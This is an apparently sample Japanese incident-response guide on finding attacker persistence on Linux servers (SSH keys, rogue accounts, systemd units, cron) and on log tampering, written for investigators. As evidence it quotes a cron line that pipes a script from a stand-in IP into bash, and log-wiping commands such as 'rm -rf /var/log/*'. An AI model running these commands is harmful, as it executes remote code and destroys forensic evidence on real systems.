---
id: sample-ja-persistence
title: "侵害された Linux サーバにおける永続化手口と調査手順"
publisher: "JPCERT/CC 形式のサンプル文書（実在の公開文書ではありません）"
published: 2026-04-22
lang: ja
severity: high
mitre: [T1098.004, T1136.001, T1543.002, T1053.003]
keywords:
  - 永続化
  - persistence
  - バックドア
  - backdoor
  - SSH鍵
  - authorized_keys
  - アカウント作成
  - account creation
  - systemd
  - cron
  - 定期実行
---

## 概要

初期侵入は一時的なものですが、永続化が成立するとインシデントは長期化します。
Linux における主要な永続化手口は、SSH 公開鍵の登録、systemd ユニットの追加、
cron エントリの追加、および新規アカウントの作成です。いずれも実施が容易で、
再起動後も維持され、そして **ログ上は正常な運用作業とほぼ区別できません**。

判別の鍵は変更の「内容」ではなく、**誰が、いつ実施したか** です。

## 1. SSH 公開鍵の登録（T1098.004）

`~/.ssh/authorized_keys` への公開鍵の追記は、最も多く観測される永続化手口です。
パスワードに依存せず、認証情報のローテーション手順からも漏れやすいという特徴が
あります。

調査:

```bash
sudo find / -name authorized_keys -not -path '*/proc/*' -printf '%T+ %u %p\n' 2>/dev/null | sort -r
sudo find /home /root -name authorized_keys -newermt '-7 days' -ls
```

対話的な root セッションが存在しない時刻に `/root/.ssh/authorized_keys` が
更新されている場合は、決定的な証拠となります。ファイルの更新時刻を
`last -F` の出力と照合してください。

以後のログインは、**正常な認証成功として記録されます**。

```
sshd[4230]: Accepted publickey for root from 203.0.113.45 port 51200 ssh2: ED25519 SHA256:xxxxx
```

この行に含まれる鍵のフィンガープリントが調査の起点です。管理台帳に存在しない
フィンガープリントによる認証成功は、それ自体がインシデントです。

## 2. 新規アカウントの作成（T1136.001）

```
useradd[4211]: new user: name=svc-backup, UID=1002, GID=1002, home=/home/svc-backup, shell=/bin/bash
usermod[4212]: add 'svc-backup' to group 'sudo'
```

`svc-`、`backup`、`monitor`、`deploy` といったサービスらしい名称は意図的な
偽装です。次の二点の確認でほぼ検出できます。

- 変更管理の対象外で作成されたアカウント
- `sudo`、`wheel`、`docker`、`adm` グループへの追加

```bash
getent group sudo docker adm
sudo awk -F: '$3 >= 1000 {print $1, $3, $6, $7}' /etc/passwd
```

## 3. systemd ユニットおよびタイマー（T1543.002）

`/etc/systemd/system` 配下に `Restart=always` を指定したユニットが設置された
場合、永続化は自動復旧機能を備えることになります。タイマーは cron より
点検されにくく、より隠密性が高い手口です。

```bash
systemctl list-unit-files --state=enabled
systemctl list-timers --all
sudo ls -lt /etc/systemd/system /usr/lib/systemd/system | head -30
```

ログ上の痕跡:

```
systemd[1]: Reloading.
systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/xmrig-proxy.service
systemd[1]: Started xmrig-proxy.service.
```

## 4. cron エントリ（T1053.003）

```bash
sudo ls -l /etc/cron.d /etc/cron.{hourly,daily,weekly,monthly}
sudo ls -l /var/spool/cron/crontabs
for u in $(cut -f1 -d: /etc/passwd); do sudo crontab -l -u "$u" 2>/dev/null | sed "s/^/$u: /"; done
```

crontab の編集も記録されます。

```
crontab[4300]: (root) REPLACE (root)
CRON[4310]: (root) CMD (curl -s http://198.51.100.99/x.sh | bash)
```

ダウンロードした内容をそのままシェルにパイプする `CMD` は、判断の余地なく
**定期実行される任意コード実行** です。周囲のログの内容にかかわらず、緊急度
「緊急」として扱ってください。

## 5. ログ改ざんの併発（T1070.002）

永続化を設置した攻撃者は、続いてログの消去を行うことが多くあります。

```
journalctl --vacuum-time=1s
truncate -s 0 /var/log/auth.log
history -c
rm -rf /var/log/*
```

これらの痕跡が確認された場合、**当該ホスト上のログは証拠として信頼できません**。
構築したタイムラインには欠落が存在すると前提してください。ホスト外へログを
転送しておくことが唯一の対策であり、ホスト上の攻撃者が改変できない複製を
確保する意味があります。

## 調査と報告の順序

調査は新しい痕跡から進めるのが効率的ですが、**報告は古い順に記述してください**。
最も古い永続化手口の設置時刻が侵害の開始時期を示し、それによって証拠保全が
必要な期間が決まります。

## 終息判断

以下をすべて確認するまで、インシデントの終息と判断しないでください。

1. すべての `authorized_keys` の内容が台帳と一致すること
2. 新規アカウントおよび特権グループの変更が説明可能であること
3. 有効な systemd ユニット、タイマー、cron エントリがすべて既知であること
4. `/etc/ld.so.preload` が存在しないこと（既定の Ubuntu では存在しません）
5. ホスト外のログとホスト上のログに矛盾がないこと

root 権限で攻撃者のコードが実行されたホストは、確実な復旧が保証できないため、
クリーンな媒体からの再構築を推奨します。
